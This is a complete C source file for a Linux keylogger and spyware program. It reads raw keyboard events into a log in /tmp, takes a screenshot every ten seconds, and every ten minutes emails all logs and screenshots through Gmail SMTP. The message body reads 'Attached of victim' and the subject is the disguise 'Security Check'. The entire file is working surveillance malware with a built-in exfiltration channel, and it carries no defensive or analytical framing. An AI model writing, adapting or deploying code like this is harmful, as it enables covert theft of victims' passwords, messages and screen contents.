#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <pthread.h>
#include <sys/stat.h>
#include <dirent.h>
#include <curl/curl.h>

#define SCREENSHOT_DIR "/tmp/screenshots"
#define FROM_EMAIL    "your_mail@gmail.com"
#define FROM_PASS     "your_pass_code"
#define TO_EMAIL      "your_mail@gmail.com"

const char *keycodes[128] = {
    [1] = "[ESC]", [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5", [7] = "6", [8] = "7", [9] = "8",
    [10] = "9", [11] = "0", [12] = "-", [13] = "=", [14] = "[BACKSPACE]", [15] = "[TAB]",
    [16] = "q", [17] = "w", [18] = "e", [19] = "r", [20] = "t", [21] = "y", [22] = "u", [23] = "i",
    [24] = "o", [25] = "p", [26] = "[", [27] = "]", [28] = "[ENTER]", [29] = "[LCTRL]",
    [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g", [35] = "h", [36] = "j", [37] = "k",
    [38] = "l", [39] = ";", [40] = "'", [41] = "`", [42] = "[LSHIFT]", [43] = "\\",
    [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n", [50] = "m",
    [51] = ",", [52] = ".", [53] = "/", [54] = "[RSHIFT]", [55] = "*", [56] = "[LALT]",
    [57] = "[SPACE]", [58] = "[CAPSLOCK]", [86] = "<LSHIFT>", [100] = "[RALT]", [97] = "[RCTRL]",
    [13] = "\""
};

void* screen_capture(void* arg) {
    mkdir(SCREENSHOT_DIR, 0755);
    while (1) {
        char timestamp[64];
        time_t now = time(NULL);
        strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", localtime(&now));

        char filepath[512];
        snprintf(filepath, sizeof(filepath), SCREENSHOT_DIR"/screenshot_%s.png", timestamp);

        char cmd[600];
        snprintf(cmd, sizeof(cmd), "scrot %s", filepath);
        system(cmd);

        sleep(10);
    }
    return NULL;
}

char* find_keyboard_device() {
    FILE* f = fopen("/proc/bus/input/devices", "r");
    if (!f) return NULL;

    char* line = NULL;
    size_t len = 0;
    char event_path[64] = {0};
    int is_keyboard = 0;

    while (getline(&line, &len, f) != -1) {
        if (strstr(line, "Name=") && strstr(line, "Keyboard"))
            is_keyboard = 1;

        if (is_keyboard && strstr(line, "Handlers") && strstr(line, "kbd") && strstr(line, "event")) {
            char* e = strstr(line, "event");
            if (e) {
                sscanf(e, "event%[^ \n]", event_path);
                break;
            }
        }

        if (strcmp(line, "\n") == 0)
            is_keyboard = 0;
    }

    fclose(f);
    free(line);

    if (event_path[0] != 0) {
        char* full = (char*)malloc(64);
        snprintf(full, 64, "/dev/input/event%s", event_path);
        return full;
    }

    return NULL;
}

void attach_files_from_dir(curl_mime *mime, const char *dir_path, const char *ext) {
    DIR *dir;
    struct dirent *ent;
    if ((dir = opendir(dir_path)) != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            if (strstr(ent->d_name, ext)) {
                char filepath[512];
                snprintf(filepath, sizeof(filepath), "%s/%s", dir_path, ent->d_name);

                curl_mimepart *part = curl_mime_addpart(mime);
                curl_mime_filedata(part, filepath);
                curl_mime_filename(part, ent->d_name);
                curl_mime_type(part, "application/octet-stream");
            }
        }
        closedir(dir);
    }
}

void* email_sender(void* arg) {
    while (1) {
        sleep(600);  

        CURL *curl = curl_easy_init();
        if (curl) {
            struct curl_slist *recipients = NULL;
            curl_mime *mime;
            curl_mimepart *part;

            mime = curl_mime_init(curl);

            part = curl_mime_addpart(mime);
            curl_mime_data(part, "Attached of victim", CURL_ZERO_TERMINATED);
            curl_mime_type(part, "text/plain");

            attach_files_from_dir(mime, "/tmp", ".log");
            attach_files_from_dir(mime, SCREENSHOT_DIR, ".png");

            curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
            curl_easy_setopt(curl, CURLOPT_USERNAME, FROM_EMAIL);
            curl_easy_setopt(curl, CURLOPT_PASSWORD, FROM_PASS);
            curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
            curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM_EMAIL);

            recipients = curl_slist_append(NULL, TO_EMAIL);
            curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "Subject: Security Check");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK)
                fprintf(stderr, "Email failed: %s\n", curl_easy_strerror(res));

            curl_slist_free_all(recipients);
            curl_mime_free(mime);
            curl_easy_cleanup(curl);
        }
    }
    return NULL;
}

int main() {
    pthread_t screenshot_thread, email_thread;
    pthread_create(&screenshot_thread, NULL, screen_capture, NULL);
    pthread_create(&email_thread, NULL, email_sender, NULL);

    char* dev_path = find_keyboard_device();
    if (!dev_path)
        return 1;

    int fd = open(dev_path, O_RDONLY);
    if (fd < 0)
        return 1;

    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    char filepath[128];
    strftime(filepath, sizeof(filepath), "/tmp/%d-%m-%Y_%H:%M.log", tm_info);

    FILE* log = fopen(filepath, "a");
    if (!log) {
        close(fd);
        return 1;
    }

    int shift = 0, caps = 0;
    struct input_event ev;

    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n == sizeof(ev)) {
            if (ev.type == EV_KEY) {
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT)
                    shift = ev.value;

                if (ev.code == KEY_CAPSLOCK && ev.value == 1)
                    caps = !caps;

                if (ev.value == 1) {
                    if (ev.code < sizeof(keycodes)/sizeof(keycodes[0])) {
                        const char* key = keycodes[ev.code];
                        if (key && key[0]) {
                            fprintf(log, "%s", key);
                            fflush(log);
                        }
                    }
                }
            }
        }
    }

    fclose(log);
    close(fd);
    free(dev_path);
    return 0;
}
